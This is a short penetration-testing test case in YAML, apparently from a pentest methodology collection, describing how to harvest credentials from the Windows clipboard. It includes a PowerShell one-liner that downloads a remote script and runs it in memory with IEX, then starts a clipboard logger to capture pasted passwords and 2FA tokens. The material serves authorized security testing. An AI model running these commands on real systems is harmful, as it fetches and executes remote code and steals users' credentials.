---
testcase: Pillaging - Monitor Clipboard for Credentials
platforms:
  - AD
  - Windows
methodology:
  - BlackBox
  - GreyBox
references:
  - https://attack.mitre.org/techniques/T1552/
how-to-test: |
  - Load a PowerShell script for clipboard monitoring (e.g., Invoke-Clipboard).
  - Start the clipboard logger:
    ```powershell
    IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
    Invoke-ClipboardLogger
    ```
  - Wait and observe clipboard activity for pasted credentials, 2FA tokens, or other sensitive data.
---
